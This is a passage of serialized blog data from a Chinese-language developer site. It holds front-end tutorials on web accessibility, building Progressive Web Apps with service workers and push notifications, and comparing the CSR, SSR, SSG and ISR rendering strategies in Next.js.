aria-required=\\"true\\">\\n```\\n\\n---\\n\\n## \ud83c\udfa8 \u989c\u8272\u548c\u5bf9\u6bd4\u5ea6\\n\\n### \u5bf9\u6bd4\u5ea6\u8981\u6c42\\n\\n```markdown\\nWCAG AA \u7ea7\u522b\uff1a\\n- \u6b63\u5e38\u6587\u672c\uff1a4.5:1\\n- \u5927\u6587\u672c\uff0818px+ \u6216 14px \u7c97\u4f53\uff09\uff1a3:1\\n\\nWCAG AAA \u7ea7\u522b\uff1a\\n- \u6b63\u5e38\u6587\u672c\uff1a7:1\\n- \u5927\u6587\u672c\uff1a4.5:1\\n```\\n\\n### \u4e0d\u53ea\u4f9d\u8d56\u989c\u8272\\n\\n```html\\n\x3c!-- \u274c \u53ea\u7528\u989c\u8272\u8868\u793a\u72b6\u6001 --\x3e\\n<span style=\\"color: red\\">\u9519\u8bef</span>\\n<span style=\\"color: green\\">\u6210\u529f</span>\\n\\n\x3c!-- \u2705 \u989c\u8272 + \u56fe\u6807/\u6587\u5b57 --\x3e\\n<span style=\\"color: red\\">\u274c \u9519\u8bef</span>\\n<span style=\\"color: green\\">\u2713 \u6210\u529f</span>\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u6d4b\u8bd5\u5de5\u5177\\n\\n| \u5de5\u5177 | \u7528\u9014 |\\n|------|------|\\n| axe DevTools | \u81ea\u52a8\u5316\u68c0\u6d4b |\\n| Lighthouse | \u7efc\u5408\u8bc4\u5206 |\\n| WAVE | \u53ef\u89c6\u5316\u95ee\u9898 |\\n| \u5c4f\u5e55\u9605\u8bfb\u5668 | \u771f\u5b9e\u4f53\u9a8c |\\n| \u952e\u76d8\u6d4b\u8bd5 | Tab \u5bfc\u822a |\\n\\n### \u81ea\u52a8\u5316\u6d4b\u8bd5\\n\\n```javascript\\n// jest-axe\\nimport { axe, toHaveNoViolations } from \'jest-axe\';\\n\\nexpect.extend(toHaveNoViolations);\\n\\ntest(\'should have no accessibility violations\', async () => {\\n  const { container } = render(<MyComponent />);\\n  const results = await axe(container);\\n  expect(results).toHaveNoViolations();\\n});\\n```\\n\\n---\\n\\n## \u2705 \u68c0\u67e5\u6e05\u5355\\n\\n```markdown\\n\u7ed3\u6784\uff1a\\n- [ ] \u4f7f\u7528\u8bed\u4e49\u5316 HTML\\n- [ ] \u6b63\u786e\u7684\u6807\u9898\u5c42\u7ea7\\n- [ ] \u5730\u6807\u533a\u57df\\n\\n\u56fe\u7247\uff1a\\n- [ ] \u6240\u6709\u56fe\u7247\u6709 alt\\n- [ ] \u88c5\u9970\u56fe\u7247 alt \u4e3a\u7a7a\\n\\n\u952e\u76d8\uff1a\\n- [ ] \u53ef Tab \u5bfc\u822a\\n- [ ] \u7126\u70b9\u53ef\u89c1\\n- [ ] \u6709\u8df3\u8fc7\u94fe\u63a5\\n\\n\u8868\u5355\uff1a\\n- [ ] \u6807\u7b7e\u5173\u8054\\n- [ ] \u9519\u8bef\u63d0\u793a\\n- [ ] \u5fc5\u586b\u6807\u8bc6\\n\\n\u989c\u8272\uff1a\\n- [ ] \u5bf9\u6bd4\u5ea6\u8fbe\u6807\\n- [ ] \u4e0d\u53ea\u4f9d\u8d56\u989c\u8272\\n```\\n\\n---\\n\\n\u65e0\u969c\u788d\u4e0d\u662f\u989d\u5916\u7684\u5de5\u4f5c\uff0c\u800c\u662f\u597d\u8bbe\u8ba1\u7684\u4e00\u90e8\u5206\u3002\u4ece\u9879\u76ee\u5f00\u59cb\u5c31\u8003\u8651\u65e0\u969c\u788d\uff0c\u6bd4\u540e\u671f\u4fee\u590d\u66f4\u5bb9\u6613\u3002"},{"id":"pwa-guide","metadata":{"permalink":"/blog/pwa-guide","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-01-20-pwa.md","source":"@site/blog/2025-01-20-pwa.md","title":"PWA \u6e10\u8fdb\u5f0f\u5e94\u7528\u5f00\u53d1\u6307\u5357","description":"PWA \u8ba9 Web \u5e94\u7528\u62e5\u6709\u63a5\u8fd1\u539f\u751f\u5e94\u7528\u7684\u4f53\u9a8c\u3002\u672c\u6587\u4ecb\u7ecd PWA \u7684\u6838\u5fc3\u6280\u672f\u548c\u5b9e\u73b0\u65b9\u6cd5\u3002","date":"2025-01-20T00:00:00.000Z","tags":[{"inline":true,"label":"PWA","permalink":"/blog/tags/pwa"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"},{"inline":true,"label":"\u79fb\u52a8\u7aef","permalink":"/blog/tags/\u79fb\u52a8\u7aef"}],"readingTime":3.67,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"pwa-guide","title":"PWA \u6e10\u8fdb\u5f0f\u5e94\u7528\u5f00\u53d1\u6307\u5357","authors":"mason","tags":["PWA","\u524d\u7aef","\u79fb\u52a8\u7aef"]},"unlisted":false,"prevItem":{"title":"\u65e0\u969c\u788d (a11y) \u5f00\u53d1\u6307\u5357","permalink":"/blog/accessibility-guide"},"nextItem":{"title":"SSR vs SSG vs ISR \u6e32\u67d3\u7b56\u7565\u5bf9\u6bd4","permalink":"/blog/ssr-ssg-isr"}},"content":"PWA \u8ba9 Web \u5e94\u7528\u62e5\u6709\u63a5\u8fd1\u539f\u751f\u5e94\u7528\u7684\u4f53\u9a8c\u3002\u672c\u6587\u4ecb\u7ecd PWA \u7684\u6838\u5fc3\u6280\u672f\u548c\u5b9e\u73b0\u65b9\u6cd5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4ec0\u4e48\u662f PWA\\n\\nPWA (Progressive Web App) \u662f\u4e00\u79cd Web \u5e94\u7528\uff0c\u5177\u5907\uff1a\\n\\n| \u7279\u6027 | \u8bf4\u660e |\\n|------|------|\\n| \u53ef\u5b89\u88c5 | \u6dfb\u52a0\u5230\u4e3b\u5c4f\u5e55 |\\n| \u79bb\u7ebf\u53ef\u7528 | Service Worker \u7f13\u5b58 |\\n| \u63a8\u9001\u901a\u77e5 | \u7528\u6237\u53ec\u56de |\\n| \u54cd\u5e94\u5f0f | \u9002\u914d\u5404\u79cd\u8bbe\u5907 |\\n| \u5b89\u5168 | \u5fc5\u987b HTTPS |\\n\\n---\\n\\n## \ud83d\udccb \u6838\u5fc3\u7ec4\u4ef6\\n\\n### 1. Web App Manifest\\n\\n```json\\n// public/manifest.json\\n{\\n  \\"name\\": \\"My PWA App\\",\\n  \\"short_name\\": \\"MyApp\\",\\n  \\"description\\": \\"A Progressive Web App\\",\\n  \\"start_url\\": \\"/\\",\\n  \\"display\\": \\"standalone\\",\\n  \\"background_color\\": \\"#ffffff\\",\\n  \\"theme_color\\": \\"#3b82f6\\",\\n  \\"orientation\\": \\"portrait\\",\\n  \\"icons\\": [\\n    {\\n      \\"src\\": \\"/icons/icon-192.png\\",\\n      \\"sizes\\": \\"192x192\\",\\n      \\"type\\": \\"image/png\\",\\n      \\"purpose\\": \\"any maskable\\"\\n    },\\n    {\\n      \\"src\\": \\"/icons/icon-512.png\\",\\n      \\"sizes\\": \\"512x512\\",\\n      \\"type\\": \\"image/png\\"\\n    }\\n  ],\\n  \\"screenshots\\": [\\n    {\\n      \\"src\\": \\"/screenshots/home.png\\",\\n      \\"sizes\\": \\"1280x720\\",\\n      \\"type\\": \\"image/png\\"\\n    }\\n  ]\\n}\\n```\\n\\n```html\\n\x3c!-- index.html --\x3e\\n<link rel=\\"manifest\\" href=\\"/manifest.json\\">\\n<meta name=\\"theme-color\\" content=\\"#3b82f6\\">\\n<meta name=\\"apple-mobile-web-app-capable\\" content=\\"yes\\">\\n<meta name=\\"apple-mobile-web-app-status-bar-style\\" content=\\"default\\">\\n<link rel=\\"apple-touch-icon\\" href=\\"/icons/icon-192.png\\">\\n```\\n\\n### 2. Service Worker\\n\\n```javascript\\n// sw.js\\nconst CACHE_NAME = \'my-pwa-v1\';\\nconst ASSETS = [\\n  \'/\',\\n  \'/index.html\',\\n  \'/styles.css\',\\n  \'/app.js\',\\n  \'/icons/icon-192.png\',\\n];\\n\\n// \u5b89\u88c5\\nself.addEventListener(\'install\', (event) => {\\n  event.waitUntil(\\n    caches.open(CACHE_NAME).then((cache) => {\\n      console.log(\'Caching assets\');\\n      return cache.addAll(ASSETS);\\n    })\\n  );\\n  self.skipWaiting();\\n});\\n\\n// \u6fc0\u6d3b\\nself.addEventListener(\'activate\', (event) => {\\n  event.waitUntil(\\n    caches.keys().then((keys) => {\\n      return Promise.all(\\n        keys\\n          .filter((key) => key !== CACHE_NAME)\\n          .map((key) => caches.delete(key))\\n      );\\n    })\\n  );\\n  self.clients.claim();\\n});\\n\\n// \u8bf7\u6c42\u62e6\u622a\\nself.addEventListener(\'fetch\', (event) => {\\n  event.respondWith(\\n    caches.match(event.request).then((cached) => {\\n      return cached || fetch(event.request);\\n    })\\n  );\\n});\\n```\\n\\n### \u6ce8\u518c Service Worker\\n\\n```javascript\\n// main.js\\nif (\'serviceWorker\' in navigator) {\\n  window.addEventListener(\'load\', () => {\\n    navigator.serviceWorker\\n      .register(\'/sw.js\')\\n      .then((reg) => {\\n        console.log(\'SW registered:\', reg.scope);\\n      })\\n      .catch((err) => {\\n        console.log(\'SW registration failed:\', err);\\n      });\\n  });\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcbe \u7f13\u5b58\u7b56\u7565\\n\\n### Cache First\\n\\n```javascript\\n// \u4f18\u5148\u7f13\u5b58\uff0c\u9002\u5408\u9759\u6001\u8d44\u6e90\\nself.addEventListener(\'fetch\', (event) => {\\n  event.respondWith(\\n    caches.match(event.request).then((cached) => {\\n      return cached || fetch(event.request).then((response) => {\\n        return caches.open(CACHE_NAME).then((cache) => {\\n          cache.put(event.request, response.clone());\\n          return response;\\n        });\\n      });\\n    })\\n  );\\n});\\n```\\n\\n### Network First\\n\\n```javascript\\n// \u4f18\u5148\u7f51\u7edc\uff0c\u9002\u5408 API \u8bf7\u6c42\\nself.addEventListener(\'fetch\', (event) => {\\n  event.respondWith(\\n    fetch(event.request)\\n      .then((response) => {\\n        const clone = response.clone();\\n        caches.open(CACHE_NAME).then((cache) => {\\n          cache.put(event.request, clone);\\n        });\\n        return response;\\n      })\\n      .catch(() => caches.match(event.request))\\n  );\\n});\\n```\\n\\n### Stale While Revalidate\\n\\n```javascript\\n// \u8fd4\u56de\u7f13\u5b58\uff0c\u540c\u65f6\u66f4\u65b0\\nself.addEventListener(\'fetch\', (event) => {\\n  event.respondWith(\\n    caches.open(CACHE_NAME).then((cache) => {\\n      return cache.match(event.request).then((cached) => {\\n        const fetchPromise = fetch(event.request).then((response) => {\\n          cache.put(event.request, response.clone());\\n          return response;\\n        });\\n        return cached || fetchPromise;\\n      });\\n    })\\n  );\\n});\\n```\\n\\n---\\n\\n## \ud83d\udcf2 \u5b89\u88c5\u63d0\u793a\\n\\n```javascript\\nlet deferredPrompt;\\n\\nwindow.addEventListener(\'beforeinstallprompt\', (e) => {\\n  e.preventDefault();\\n  deferredPrompt = e;\\n  showInstallButton();\\n});\\n\\nasync function handleInstallClick() {\\n  if (!deferredPrompt) return;\\n  \\n  deferredPrompt.prompt();\\n  const { outcome } = await deferredPrompt.userChoice;\\n  \\n  console.log(`User ${outcome === \'accepted\' ? \'accepted\' : \'dismissed\'} install`);\\n  deferredPrompt = null;\\n  hideInstallButton();\\n}\\n\\nwindow.addEventListener(\'appinstalled\', () => {\\n  console.log(\'App installed\');\\n  hideInstallButton();\\n});\\n```\\n\\n---\\n\\n## \ud83d\udd14 \u63a8\u9001\u901a\u77e5\\n\\n### \u8bf7\u6c42\u6743\u9650\\n\\n```javascript\\nasync function requestNotificationPermission() {\\n  const permission = await Notification.requestPermission();\\n  \\n  if (permission === \'granted\') {\\n    console.log(\'Notification permission granted\');\\n    subscribeToNotifications();\\n  }\\n}\\n```\\n\\n### \u8ba2\u9605\u63a8\u9001\\n\\n```javascript\\nasync function subscribeToNotifications() {\\n  const registration = await navigator.serviceWorker.ready;\\n  \\n  const subscription = await registration.pushManager.subscribe({\\n    userVisibleOnly: true,\\n    applicationServerKey: urlBase64ToUint8Array(VAPID_PUBLIC_KEY),\\n  });\\n\\n  // \u53d1\u9001\u5230\u670d\u52a1\u5668\\n  await fetch(\'/api/subscribe\', {\\n    method: \'POST\',\\n    body: JSON.stringify(subscription),\\n  });\\n}\\n```\\n\\n### \u63a5\u6536\u63a8\u9001 (Service Worker)\\n\\n```javascript\\nself.addEventListener(\'push\', (event) => {\\n  const data = event.data?.json() || {};\\n  \\n  event.waitUntil(\\n    self.registration.showNotification(data.title, {\\n      body: data.body,\\n      icon: \'/icons/icon-192.png\',\\n      badge: \'/icons/badge.png\',\\n      data: { url: data.url },\\n    })\\n  );\\n});\\n\\nself.addEventListener(\'notificationclick\', (event) => {\\n  event.notification.close();\\n  \\n  event.waitUntil(\\n    clients.openWindow(event.notification.data.url)\\n  );\\n});\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f Workbox \u7b80\u5316\u5f00\u53d1\\n\\n```bash\\nnpm install workbox-cli --save-dev\\n```\\n\\n```javascript\\n// sw.js with Workbox\\nimport { precacheAndRoute } from \'workbox-precaching\';\\nimport { registerRoute } from \'workbox-routing\';\\nimport { CacheFirst, NetworkFirst, StaleWhileRevalidate } from \'workbox-strategies\';\\nimport { ExpirationPlugin } from \'workbox-expiration\';\\n\\n// \u9884\u7f13\u5b58\\nprecacheAndRoute(self.__WB_MANIFEST);\\n\\n// \u56fe\u7247\u7f13\u5b58\\nregisterRoute(\\n  ({ request }) => request.destination === \'image\',\\n  new CacheFirst({\\n    cacheName: \'images\',\\n    plugins: [\\n      new ExpirationPlugin({\\n        maxEntries: 50,\\n        maxAgeSeconds: 30 * 24 * 60 * 60, // 30 days\\n      }),\\n    ],\\n  })\\n);\\n\\n// API \u8bf7\u6c42\\nregisterRoute(\\n  ({ url }) => url.pathname.startsWith(\'/api\'),\\n  new NetworkFirst({\\n    cacheName: \'api-cache\',\\n  })\\n);\\n\\n// \u9759\u6001\u8d44\u6e90\\nregisterRoute(\\n  ({ request }) => [\'style\', \'script\', \'font\'].includes(request.destination),\\n  new StaleWhileRevalidate({\\n    cacheName: \'static-resources\',\\n  })\\n);\\n```\\n\\n---\\n\\n## \ud83d\udcf1 \u6846\u67b6\u96c6\u6210\\n\\n### Next.js\\n\\n```bash\\nnpm install next-pwa\\n```\\n\\n```javascript\\n// next.config.js\\nconst withPWA = require(\'next-pwa\')({\\n  dest: \'public\',\\n  register: true,\\n  skipWaiting: true,\\n  disable: process.env.NODE_ENV === \'development\',\\n});\\n\\nmodule.exports = withPWA({\\n  // next config\\n});\\n```\\n\\n### Vite\\n\\n```bash\\nnpm install vite-plugin-pwa\\n```\\n\\n```javascript\\n// vite.config.js\\nimport { VitePWA } from \'vite-plugin-pwa\';\\n\\nexport default {\\n  plugins: [\\n    VitePWA({\\n      registerType: \'autoUpdate\',\\n      manifest: {\\n        name: \'My App\',\\n        short_name: \'App\',\\n        theme_color: \'#3b82f6\',\\n      },\\n      workbox: {\\n        globPatterns: [\'**/*.{js,css,html,ico,png,svg}\'],\\n      },\\n    }),\\n  ],\\n};\\n```\\n\\n---\\n\\n## \u2705 PWA \u68c0\u67e5\u6e05\u5355\\n\\n```markdown\\n\u57fa\u7840\u8981\u6c42\uff1a\\n- [ ] HTTPS\\n- [ ] Web App Manifest\\n- [ ] Service Worker\\n- [ ] \u54cd\u5e94\u5f0f\u8bbe\u8ba1\\n- [ ] \u79bb\u7ebf\u9875\u9762\\n\\n\u589e\u5f3a\u529f\u80fd\uff1a\\n- [ ] \u5b89\u88c5\u63d0\u793a\\n- [ ] \u63a8\u9001\u901a\u77e5\\n- [ ] \u540e\u53f0\u540c\u6b65\\n- [ ] \u5206\u4eab API\\n\\n\u6027\u80fd\uff1a\\n- [ ] \u5feb\u901f\u9996\u5c4f\\n- [ ] \u8d44\u6e90\u9884\u7f13\u5b58\\n- [ ] \u56fe\u7247\u4f18\u5316\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u8c03\u8bd5\u5de5\u5177\\n\\n```markdown\\nChrome DevTools:\\n1. Application \u2192 Manifest\uff1a\u68c0\u67e5\u6e05\u5355\\n2. Application \u2192 Service Workers\uff1a\u8c03\u8bd5 SW\\n3. Application \u2192 Cache Storage\uff1a\u67e5\u770b\u7f13\u5b58\\n4. Lighthouse \u2192 PWA\uff1a\u8bc4\u5206\u68c0\u6d4b\\n```\\n\\n---\\n\\nPWA \u8ba9 Web \u5e94\u7528\u66f4\u63a5\u8fd1\u539f\u751f\u4f53\u9a8c\uff0c\u662f\u63d0\u5347\u7528\u6237\u53c2\u4e0e\u5ea6\u7684\u6709\u6548\u624b\u6bb5\u3002"},{"id":"ssr-ssg-isr","metadata":{"permalink":"/blog/ssr-ssg-isr","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-01-05-ssr-ssg-isr.md","source":"@site/blog/2025-01-05-ssr-ssg-isr.md","title":"SSR vs SSG vs ISR \u6e32\u67d3\u7b56\u7565\u5bf9\u6bd4","description":"\u73b0\u4ee3\u524d\u7aef\u6709\u591a\u79cd\u6e32\u67d3\u7b56\u7565\u53ef\u9009\u3002\u672c\u6587\u5bf9\u6bd4 SSR\u3001SSG\u3001ISR\u3001CSR \u7684\u7279\u70b9\u548c\u9002\u7528\u573a\u666f\u3002","date":"2025-01-05T00:00:00.000Z","tags":[{"inline":true,"label":"\u6e32\u67d3","permalink":"/blog/tags/\u6e32\u67d3"},{"inline":true,"label":"Next.js","permalink":"/blog/tags/next-js"},{"inline":true,"label":"\u6027\u80fd","permalink":"/blog/tags/\u6027\u80fd"}],"readingTime":4.34,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"ssr-ssg-isr","title":"SSR vs SSG vs ISR \u6e32\u67d3\u7b56\u7565\u5bf9\u6bd4","authors":"mason","tags":["\u6e32\u67d3","Next.js","\u6027\u80fd"]},"unlisted":false,"prevItem":{"title":"PWA \u6e10\u8fdb\u5f0f\u5e94\u7528\u5f00\u53d1\u6307\u5357","permalink":"/blog/pwa-guide"},"nextItem":{"title":"\u5fae\u524d\u7aef\u67b6\u6784\u8bbe\u8ba1\u6307\u5357","permalink":"/blog/micro-frontend"}},"content":"\u73b0\u4ee3\u524d\u7aef\u6709\u591a\u79cd\u6e32\u67d3\u7b56\u7565\u53ef\u9009\u3002\u672c\u6587\u5bf9\u6bd4 SSR\u3001SSG\u3001ISR\u3001CSR \u7684\u7279\u70b9\u548c\u9002\u7528\u573a\u666f\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u6e32\u67d3\u7b56\u7565\u6982\u89c8\\n\\n| \u7b56\u7565 | \u5168\u79f0 | \u6e32\u67d3\u65f6\u673a | \u7279\u70b9 |\\n|------|------|---------|------|\\n| **CSR** | Client-Side Rendering | \u6d4f\u89c8\u5668 | SPA \u9ed8\u8ba4 |\\n| **SSR** | Server-Side Rendering | \u6bcf\u6b21\u8bf7\u6c42 | \u52a8\u6001\u5185\u5bb9 |\\n| **SSG** | Static Site Generation | \u6784\u5efa\u65f6 | \u9759\u6001\u5185\u5bb9 |\\n| **ISR** | Incremental Static Regeneration | \u6309\u9700\u91cd\u65b0\u751f\u6210 | \u6df7\u5408\u7b56\u7565 |\\n\\n---\\n\\n## \ud83d\udda5\ufe0f CSR \u5ba2\u6237\u7aef\u6e32\u67d3\\n\\n### \u5de5\u4f5c\u6d41\u7a0b\\n\\n```\\n1. \u6d4f\u89c8\u5668\u8bf7\u6c42 HTML\\n2. \u8fd4\u56de\u7a7a HTML + JS\\n3. \u4e0b\u8f7d\u5e76\u6267\u884c JS\\n4. JS \u8bf7\u6c42\u6570\u636e\\n5. \u6e32\u67d3\u9875\u9762\\n```\\n\\n### \u793a\u4f8b (React)\\n\\n```tsx\\nfunction Posts() {\\n  const [posts, setPosts] = useState([]);\\n  const [loading, setLoading] = useState(true);\\n\\n  useEffect(() => {\\n    fetch(\'/api/posts\')\\n      .then(res => res.json())\\n      .then(data => {\\n        setPosts(data);\\n        setLoading(false);\\n      });\\n  }, []);\\n\\n  if (loading) return <Loading />;\\n  \\n  return <PostList posts={posts} />;\\n}\\n```\\n\\n### \u4f18\u7f3a\u70b9\\n\\n```markdown\\n\u2705 \u4f18\u70b9\uff1a\\n- \u4ea4\u4e92\u4f53\u9a8c\u597d\\n- \u670d\u52a1\u5668\u538b\u529b\u5c0f\\n- \u90e8\u7f72\u7b80\u5355\uff08CDN\uff09\\n\\n\u274c \u7f3a\u70b9\uff1a\\n- \u9996\u5c4f\u52a0\u8f7d\u6162\\n- SEO \u4e0d\u53cb\u597d\\n- \u767d\u5c4f\u65f6\u95f4\u957f\\n```\\n\\n### \u9002\u7528\u573a\u666f\\n\\n```markdown\\n- \u540e\u53f0\u7ba1\u7406\u7cfb\u7edf\\n- \u4e0d\u9700\u8981 SEO \u7684\u5e94\u7528\\n- \u9ad8\u5ea6\u4ea4\u4e92\u7684\u5e94\u7528\\n- \u7528\u6237\u767b\u5f55\u540e\u7684\u9875\u9762\\n```\\n\\n---\\n\\n## \ud83c\udf10 SSR \u670d\u52a1\u7aef\u6e32\u67d3\\n\\n### \u5de5\u4f5c\u6d41\u7a0b\\n\\n```\\n1. \u6d4f\u89c8\u5668\u8bf7\u6c42\u9875\u9762\\n2. \u670d\u52a1\u5668\u83b7\u53d6\u6570\u636e\\n3. \u670d\u52a1\u5668\u6e32\u67d3 HTML\\n4. \u8fd4\u56de\u5b8c\u6574 HTML\\n5. \u6d4f\u89c8\u5668\u663e\u793a\u9875\u9762\\n6. Hydration \u6fc0\u6d3b\u4ea4\u4e92\\n```\\n\\n### \u793a\u4f8b (Next.js)\\n\\n```tsx\\n// app/posts/page.tsx\\nasync function getPosts() {\\n  const res = await fetch(\'https://api.example.com/posts\', {\\n    cache: \'no-store\', // \u6bcf\u6b21\u8bf7\u6c42\u90fd\u83b7\u53d6\\n  });\\n  return res.json();\\n}\\n\\nexport default async function PostsPage() {\\n  const posts = await getPosts();\\n\\n  return (\\n    <div>\\n      <h1>Posts</h1>\\n      <PostList posts={posts} />\\n    </div>\\n  );\\n}\\n```\\n\\n### \u4f18\u7f3a\u70b9\\n\\n```markdown\\n\u2705 \u4f18\u70b9\uff1a\\n- \u9996\u5c4f\u52a0\u8f7d\u5feb\\n- SEO \u53cb\u597d\\n- \u6570\u636e\u5b9e\u65f6\u6027\u597d\\n\\n\u274c \u7f3a\u70b9\uff1a\\n- \u670d\u52a1\u5668\u538b\u529b\u5927\\n- TTFB \u8f83\u957f\\n- \u9700\u8981\u670d\u52a1\u5668\u8fd0\u884c\\n- \u6210\u672c\u8f83\u9ad8\\n```\\n\\n### \u9002\u7528\u573a\u666f\\n\\n```markdown\\n- \u9700\u8981 SEO \u7684\u9875\u9762\\n- \u6570\u636e\u9891\u7e41\u66f4\u65b0\\n- \u4e2a\u6027\u5316\u5185\u5bb9\\n- \u7528\u6237\u76f8\u5173\u9875\u9762\\n```\\n\\n---\\n\\n## \ud83d\udcc4 SSG \u9759\u6001\u751f\u6210\\n\\n### \u5de5\u4f5c\u6d41\u7a0b\\n\\n```\\n\u6784\u5efa\u9636\u6bb5\uff1a\\n1. \u83b7\u53d6\u6240\u6709\u6570\u636e\\n2. \u751f\u6210\u6240\u6709 HTML\\n3. \u90e8\u7f72\u5230 CDN\\n\\n\u8bbf\u95ee\u9636\u6bb5\uff1a\\n1. \u76f4\u63a5\u8fd4\u56de\u9759\u6001 HTML\\n```\\n\\n### \u793a\u4f8b (Next.js)\\n\\n```tsx\\n// app/blog/[slug]/page.tsx\\n\\n// \u751f\u6210\u9759\u6001\u8def\u5f84\\nexport async function generateStaticParams() {\\n  const posts = await getPosts();\\n  return posts.map((post) => ({\\n    slug: post.slug,\\n  }));\\n}\\n\\n// \u9875\u9762\u7ec4\u4ef6\\nexport default async function PostPage({ params }: { params: { slug: string } }) {\\n  const post = await getPost(params.slug);\\n  \\n  return (\\n    <article>\\n      <h1>{post.title}</h1>\\n      <div>{post.content}</div>\\n    </article>\\n  );\\n}\\n\\n// \u6570\u636e\u83b7\u53d6\uff08\u6784\u5efa\u65f6\u7f13\u5b58\uff09\\nasync function getPost(slug: string) {\\n  const res = await fetch(`https://api.example.com/posts/${slug}`, {\\n    cache: \'force-cache\', // \u9ed8\u8ba4\uff0c\u6784\u5efa\u65f6\u7f13\u5b58\\n  });\\n  return res.json();\\n}\\n```\\n\\n### \u4f18\u7f3a\u70b9\\n\\n```markdown\\n\u2705 \u4f18\u70b9\uff1a\\n- \u6027\u80fd\u6700\u597d\\n- CDN \u52a0\u901f\\n- \u6210\u672c\u4f4e\\n- \u5b89\u5168\u6027\u9ad8\\n\\n\u274c \u7f3a\u70b9\uff1a\\n- \u6570\u636e\u66f4\u65b0\u9700\u91cd\u65b0\u6784\u5efa\\n- \u6784\u5efa\u65f6\u95f4\u957f\uff08\u5927\u91cf\u9875\u9762\uff09\\n- \u4e0d\u9002\u5408\u9891\u7e41\u66f4\u65b0\u5185\u5bb9\\n```\\n\\n### \u9002\u7528\u573a\u666f\\n\\n```markdown\\n- \u535a\u5ba2\u3001\u6587\u6863\\n- \u8425\u9500\u9875\u9762\\n- \u4ea7\u54c1\u4ecb\u7ecd\\n- \u5185\u5bb9\u4e0d\u5e38\u53d8\u5316\u7684\u9875\u9762\\n```\\n\\n---\\n\\n## \u267b\ufe0f ISR \u589e\u91cf\u9759\u6001\u518d\u751f\\n\\n### \u5de5\u4f5c\u6d41\u7a0b\\n\\n```\\n1. \u6784\u5efa\u65f6\u751f\u6210\u9759\u6001\u9875\u9762\\n2. \u8bbe\u7f6e\u91cd\u65b0\u9a8c\u8bc1\u65f6\u95f4\\n3. \u8d85\u65f6\u540e\uff0c\u4e0b\u6b21\u8bf7\u6c42\u89e6\u53d1\u91cd\u65b0\u751f\u6210\\n4. \u65b0\u9875\u9762\u66ff\u6362\u65e7\u9875\u9762\\n```\\n\\n### \u793a\u4f8b (Next.js)\\n\\n```tsx\\n// app/products/[id]/page.tsx\\n\\nexport default async function ProductPage({ params }: { params: { id: string } }) {\\n  const product = await getProduct(params.id);\\n  \\n  return (\\n    <div>\\n      <h1>{product.name}</h1>\\n      <p>${product.price}</p>\\n    </div>\\n  );\\n}\\n\\nasync function getProduct(id: string) {\\n  const res = await fetch(`https://api.example.com/products/${id}`, {\\n    next: { revalidate: 60 }, // 60 \u79d2\u540e\u91cd\u65b0\u9a8c\u8bc1\\n  });\\n  return res.json();\\n}\\n```\\n\\n### \u6309\u9700\u91cd\u65b0\u9a8c\u8bc1\\n\\n```tsx\\n// app/api/revalidate/route.ts\\nimport { revalidatePath, revalidateTag } from \'next/cache\';\\nimport { NextRequest } from \'next/server\';\\n\\nexport async function POST(request: NextRequest) {\\n  const { path, tag } = await request.json();\\n\\n  if (path) {\\n    revalidatePath(path);\\n  }\\n  \\n  if (tag) {\\n    revalidateTag(tag);\\n  }\\n\\n  return Response.json({ revalidated: true });\\n}\\n\\n// \u4f7f\u7528 tag\\nasync function getProduct(id: string) {\\n  const res = await fetch(`https://api.example.com/products/${id}`, {\\n    next: { tags: [\'products\', `product-${id}`] },\\n  });\\n  return res.json();\\n}\\n\\n// \u89e6\u53d1\u91cd\u65b0\u9a8c\u8bc1\\nawait fetch(\'/api/revalidate\', {\\n  method: \'POST\',\\n  body: JSON.stringify({ tag: \'products\' }),\\n});\\n```\\n\\n### \u4f18\u7f3a\u70b9\\n\\n```markdown\\n\u2705 \u4f18\u70b9\uff1a\\n- \u517c\u987e\u6027\u80fd\u548c\u5b9e\u65f6\u6027\\n- \u6309\u9700\u66f4\u65b0\\n- \u51cf\u5c11\u6784\u5efa\u65f6\u95f4\\n\\n\u274c \u7f3a\u70b9\uff1a\\n- \u9996\u6b21\u8bbf\u95ee\u53ef\u80fd\u8fd4\u56de\u65e7\u6570\u636e\\n- \u914d\u7f6e\u590d\u6742\u5ea6\u589e\u52a0\\n```\\n\\n### \u9002\u7528\u573a\u666f\\n\\n```markdown\\n- \u7535\u5546\u4ea7\u54c1\u9875\\n- \u65b0\u95fb\u5185\u5bb9\\n- \u9700\u8981\u5b9a\u671f\u66f4\u65b0\u7684\u9759\u6001\u5185\u5bb9\\n```\\n\\n---\\n\\n## \ud83d\udcca \u5bf9\u6bd4\u603b\u7ed3\\n\\n| \u7ef4\u5ea6 | CSR | SSR | SSG | ISR |\\n|------|-----|-----|-----|-----|\\n| \u9996\u5c4f\u901f\u5ea6 | \u6162 | \u4e2d | \u5feb | \u5feb |\\n| SEO | \u5dee | \u597d | \u597d | \u597d |\\n| \u6570\u636e\u5b9e\u65f6\u6027 | \u9ad8 | \u9ad8 | \u4f4e | \u4e2d |\\n| \u670d\u52a1\u5668\u8d1f\u8f7d | \u4f4e | \u9ad8 | \u65e0 | \u4f4e |\\n| \u6784\u5efa\u65f6\u95f4 | \u77ed | - | \u957f | \u4e2d |\\n| \u90e8\u7f72\u6210\u672c | \u4f4e | \u9ad8 | \u4f4e | \u4f4e |\\n\\n---\\n\\n## \ud83c\udfa8 \u6df7\u5408\u4f7f\u7528\\n\\n### Next.js \u4e2d\u7684\u6df7\u5408\u7b56\u7565\\n\\n```tsx\\n// \u9759\u6001\u9875\u9762\\n// app/about/page.tsx\\nexport default function About() {\\n  return <div>About Us</div>;\\n}\\n\\n// 